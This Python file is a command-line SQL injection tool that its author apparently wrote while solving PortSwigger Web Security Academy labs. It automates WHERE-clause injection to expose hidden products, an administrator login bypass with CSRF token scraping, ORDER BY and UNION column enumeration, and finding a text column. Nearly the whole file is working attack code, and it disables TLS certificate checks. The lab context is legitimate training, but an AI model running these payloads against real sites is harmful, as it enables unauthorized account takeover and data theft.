import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup
import signal

# import argparse
# import textwrap

""" ############################################################################
Webtest python script for testing web app vulnerabilities. 

Inspired by Rana Khalil while taking her "Web Security Academy Series" Course.
https://academy.ranakhalil.com/courses/

Created while working on the portswigger web-security labs.
https://portswigger.net/web-security/all-labs
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# For Burp Suite or ZAP proxy.
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def error_usage(exp):
    # exploit_types = ['wc', 'lb', 'uc']
    if exp == "wc":
        print(
            "[-] Usage: %s <exploit_type> <url> <path_qparams> <payload> <visible> <var_to_count>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s wc https://website.net "/filter?category=" "\' OR 1=1 --" 12 productId='
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"
        )
    elif exp == "lb":
        print(
            "[-] Usage: %s <exploit_type> <url> <sql-payload> <text-to-search>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s lb "https://website.net/login" "administrator\' --" "Log out"'
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/lab-login-bypass"
        )
    elif exp == "uc":
        print(
            "[-] Usage: %s <exploit_type> <payload_type> <url> <path_param>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s uc orderby https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s uc union https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns"
        )
    elif exp == "sd":
        print(
            "[-] Usage: %s <exploit_type> <payload_type> <url> <path_param>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s sd orderby https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s sd union https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text"
        )
    # sys.exit(-1)


""" run_exploit(args) ##########################################################
This will just run the selected exploit or print error_usage(exp).
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


def run_exploit(args):
    # args = sys.argv[2:]
    exploit_types = ["wc", "lb", "uc"]
    exploit_type = sys.argv[1]
    if exploit_type == "wc":
        try:
            url, path_qparams, payload, visible, var_to_count = (
                sys.argv[2],
                sys.argv[3],
                sys.argv[4],
                sys.argv[5],
                sys.argv[6],
            )
            where_clause = WhereClause(
                url, path_qparams, payload, visible, var_to_count
            )
            where_clause.exploit_sqli(url, path_qparams, payload, visible, var_to_count)
        # If it doesn't have all the parameters, we print usage.
        except IndexError:
            error_usage(exploit_type)
    elif exploit_type == "lb":
        try:
            url, payload, text = sys.argv[2], sys.argv[3], sys.argv[4]
            sess = requests.Session()
            login_bypass = LoginBypass(sess, url, payload, text)
            login_bypass.exploit_sqli(sess, url, payload, text)
        # If it doesn't have all the parameters, we print usage.
        except IndexError as error:
            error_usage(exploit_type)
    elif exploit_type == "uc":
        try:
            payload_type, url, path_param = sys.argv[2], sys.argv[3], sys.argv[4]
            union_cols = UnionCols(payload_type, url, path_param)
            union_cols.exploit_sqli(payload_type, url, path_param)
        # If it doesn't have all the parameters, we print usage.
        except IndexError as error:
            error_usage(exploit_type)
    elif exploit_type == "sd":
        try:
            payload_type, url, path_param = sys.argv[2], sys.argv[3], sys.argv[4]
            hint = StringData.get_string(url, path_param)
            string_data = StringData(payload_type, url, path_param, hint)
            num = string_data.get_column_number(payload_type, url, path_param)
            if num:
                string_data.exploit_sqli(num, url, path_param, hint)
        # If it doesn't have all the parameters, we print usage.
        except IndexError as error:
            error_usage(exploit_type)
    elif exploit_type not in exploit_types:
        print(f'That "{exploit_type}" exploit type doesn\'t exist here.')
        sys.exit(-1)


""" WhereClause ################################################################
SQLi vulnerability in the product category filter. When a category is selected, 
the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Attack Will cause the application to display one or more unreleased products.
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class WhereClause:
    def __init__(self, url, payload, visible, var_to_count) -> None:
        self.url = (url,)
        self.payload = (payload,)
        self.visible = (visible,)
        self.var_to_count = var_to_count

    def exploit_sqli(url, path_qparams, payload, visible, var_to_count):
        # uri = '/filter?category='
        # req = requests.get(url + uri + payload, verify=False, proxies=proxies)
        req = requests.get(url + path_qparams + payload, verify=False, proxies=proxies)
        # Check if the response code has an unreleased item that is not public.
        html = req.text
        # Check how many products are loaded in HTML by counting items.
        # Example string: productId=
        numProducts = html.count(var_to_count)
        # Use 'if numProducts == 20' if you know the amount or 'if numProducts > 12'
        # if you only know what is visible.
        vis = int(visible)
        if numProducts > vis:
            print("[+] SQL injection successful...")
            print(f"[+] There are {numProducts - vis} hidden items.")
        else:
            print("[-] SQL injection unsuccessful...")


""" LoginBypass() ##############################################################
SQLi vulnerability in the login function. This is an SQL injection attack where 
you can log in to the application as the administrator user.
https://portswigger.net/web-security/sql-injection/lab-login-bypass
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class LoginBypass:
    def __init__(self, sess, url, payload, text) -> None:
        self.sess = (sess,)
        self.url = (url,)
        self.payload = (payload,)
        self.text = text

    def get_csrf_token(self, sess, url):
        # print(sys.argv[2], sys.argv[3], sys.argv[4])
        try:
            req = sess.get(url, verify=False, proxies=proxies)
            # Check the HTML to see where to parse the CSRF from.
            beau_soup = BeautifulSoup(req.text, "html.parser")
            # Find the first input element and get its value.
            csrf = beau_soup.find("input")["value"]
            return csrf
        except Exception as e:
            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            message = template.format(type(e).__name__, e.args)
            if type(e).__name__ == "ProxyError":
                print("Error Type: ProxyError. Check the proxy.")
            else:
                print("CSRF Error Return Type: ", message)

    def exploit_sqli(self, sess, url, payload, text):
        # Use Session to make certain parameters persistent across the session.
        # You don't want to send a new request every time in this case.
        # For example, we will need the cookie to stay the same.
        sess = requests.Session()
        csrf = self.get_csrf_token(sess, url)
        # Data needed for the exploit.
        data = {"csrf": csrf, "username": payload, "password": "anything"}
        # Send a POST request.
        try:
            req = sess.post(url, data=data, verify=False, proxies=proxies)
            # Check if the request logged in by looking in the response text.
            # If true, it means the exploit worked as intended.
            res = req.text
            if text in res:
                print("[+] SQL injection successful. You we're logged in.")
            else:
                print("[-] SQL injection unsuccessful.")
        except Exception as e:
            print("SQLi Error Return Type: ", type(e))


""" UnionCols ##################################################################
SQLi UNION (and ORDER BY) attack, where the number of columns is determined when
the query is returned. The vulnerability is in the product category filter.
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class UnionCols:
    def __init__(self, payload_type, url, path_param) -> None:
        self.payload_type = (payload_type,)
        self.url = (url,)
        self.path_param = path_param
        self.columns = 0

    def column_number(self, payload_type, url, path_param):
        # print("payload_type: ", payload_type)
        # print("url: ", url)
        # print("path_param: ", path_param)
        # Run exploit with ORDER BY clause.
        if payload_type == "orderby":
            print("[+] Using the ORDER BY clause.")
            print("[+] Figuring out number of columns...")
            try:
                for i in range(1, 25):
                    # Assemble payload.
                    sql_payload = "'+order+by+%s--" % i
                    print(f"{i} : {sql_payload}")
                    # sql_payload = "{}%s{}".format(payload[0], payload[1]) %i
                    # Get request with payload.
                    r = requests.get(
                        url + path_param + sql_payload, verify=False, proxies=proxies
                    )
                    # Get the text from the request.
                    res = r.text
                    # If Internal Server Error is found in the text, column is the previous index.
                    if "Internal Server Error" in res:
                        print(f"Internal Server Error happens at column {i}.")
                        # Subtract 1 from where index stopped to get number of columns.
                        self.columns = i - 1
                        print("[+] The number of columns is " + str(self.columns) + ".")
                        return self.columns
                return False
            except Exception as e:
                print("SQLi Error Return Type: ", type(e))
        # Run exploit with UNION operation.
        elif payload_type == "union":
            print("[+] Using a UNION operation.")
            print("[+] Figuring out number of columns...")
            sql_payload = "'+UNION+select+NULL--"
            text = ",+NULL"
            substr = "--"
            index = sql_payload.index(substr)
            union = False
            try:
                for i in range(1, 25):
                    # Count the number of NULL.
                    num = sql_payload.count("NULL")
                    # If current index is first NULL, run it for the first time.
                    if num == 1 and union == False:
                        print(f"{i} : {sql_payload}")
                        # Get request with first payload.
                        r = requests.get(
                            url + path_param + sql_payload,
                            verify=False,
                            proxies=proxies,
                        )
                        # Get the text from the request.
                        res = r.text
                        # Assemble Payload and add another NULL
                        sql_payload = sql_payload[:index] + text + sql_payload[index:]
                        # If UNION select is printed in HTML on first index, return column number.
                        if "UNION select" in res:
                            self.columns = i
                    # If current index passed first NULL, keep adding NULL to string.
                    elif num > 1 and union == False:
                        print(f"{i} : {sql_payload}")
                        sql_payload = sql_payload[:index] + text + sql_payload[index:]
                        r = requests.get(
                            url + path_param + sql_payload,
                            verify=False,
                            proxies=proxies,
                        )
                        res = r.text
                        if "UNION select" in res:
                            union = True
                    # If current index passed first NULL and union is true, the column has been found.
                    elif num > 1 and union == True:
                        print(f"{i} : {sql_payload}")
                        print(f"UNION select printed in HTML at column {i}.")
                        self.columns = i
                        print("[+] The number of columns is " + str(self.columns) + ".")
                        return self.columns
                return False
            except Exception as e:
                print("SQLi Error Return Type: ", type(e))

    def exploit_sqli(self, payload_type, url, path_param):
        number_of_cols = self.column_number(payload_type, url, path_param)
        if number_of_cols:
            print("[+] SQL injection successful...")
        else:
            print("[-] The SQLi was not successful...")


""" StringData #################################################################
SQLi vulnerability in the product category filter. Use a union or order by attack
to retrieve data from other tables. 
1) Determine the number of columns returned by the query. 
2) Identify a column that is compatible with string data.
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class StringData:
    def __init__(self, payload_type, url, path_param, hint) -> None:
        self.payload_type = (payload_type,)
        self.url = (url,)
        self.path_param = path_param
        self.hint = hint
        self.text = False

    # Call UnionCols.column_number() to get number of columns.
    def get_column_number(self, payload_type, url, path_param):
        col_num = UnionCols(payload_type, url, path_param)
        num = col_num.column_number(payload_type, url, path_param)
        return num

    """ get_string(url, path_param) 
    Extract and return the string from the HTML that you need to solve the lab. """

    def get_string(url, path_param):
        try:
            req = requests.get(url + path_param, verify=False, proxies=proxies)
            soup = BeautifulSoup(req.text, "html.parser")
            # Get the p tag with the hint id.
            results = soup.find("p", attrs={"id": "hint"})
            # res = re.search(r"'\s*([^']+?)\s*'", str(results)).groups()[0]
            # print('%r' % res)
            # Get the characters between the single quotes in the text.
            res = re.search(r"'([^']*)'", str(results)).groups()[0]
            # print(res)
            return res
        except Exception as e:
            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            # message = template.format(type(e).__name__, e.args)
            if type(e).__name__ == "ProxyError":
                print("Error Type: ProxyError. Check the proxy.")
            else:
                print("Error Return Type: ", type(e))

    """ exploit_sqli_string(num_col, url, path_param, hint) 
    Loop though the column numbers, test each request for SQLi and check the HTML 
    for when the query text matches the original hint. """

    def exploit_sqli_string(self, num_col, url, path_param, hint):
        # print(url, path_param, hint)
        # print(f"[+] The number of columns is {str(num_col)}." )
        print("---------------------------------------------------")
        print("[+] Figuring out which column contains text...")
        try:
            for i in range(1, num_col + 1):
                string = f"'{hint}'"
                # Remove single quotes from string.
                string_strip = string.strip("'")
                # Create list with three NULL using number of columns.
                payload_list = ["NULL"] * num_col
                # Insert hint at next index after each pass.
                payload_list[i - 1] = string
                # Prepare string to inject into list.
                list_join_str = ", ".join(payload_list)
                # sql_payload = "' union select " + ', '.join(payload_list) + "--"
                # Inject string into next index after each pass.
                sql_payload = f"' union select  {list_join_str}--"
                print(f"{i} Payload: {sql_payload}")
                # Send request with the next assembled payload.
                req = requests.get(
                    url + path_param + sql_payload, verify=False, proxies=proxies
                )
                soup = BeautifulSoup(req.text, "html.parser")
                # Locate sting if it was outputted down in the HTML.
                res = soup.find("section", attrs={"class": "maincontainer"})
                hint_output = re.search(hint, str(res))
                # If the output was found, this column is a string data type.
                if hint_output is not None and string_strip == hint_output.group():
                    # if hint_output is not None:
                    print(f"{i} [+] Searching for text: {hint_output.group()}")
                    print(f"{i} [+] Column {str(i)} contains text, a string data type.")
                    print("---------------------------------------------------")
                    self.text = True
                elif hint_output is None:
                    print(f"{i} [+] Searching for text: {string}")
                    print(f"{i} [-]{string} was not found.")
                    print(f"{i} [-] Column {str(i)} is not a string data type.")
                    print("---------------------------------------------------")
            if self.text:
                return True
            else:
                return False
        except Exception as e:
            print("SQLi Error Return Type: ", type(e))

    def exploit_sqli(self, num, url, path_param, hint):
        text_found = self.exploit_sqli_string(num, url, path_param, hint)
        if text_found:
            print("[+] SQL injection successful...")
        else:
            print("[-] The SQLi was not successful...")


def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        args = sys.argv[1:]
        run_exploit(args)
    except IndexError:
        print("[-] Show usage for exploit type: python3 %s wc " % sys.argv[0])
        print("wc = Where Clause")
        print("lb = Login Bypass")
        print("uc = Union Columns")
        print("sd = String Data")
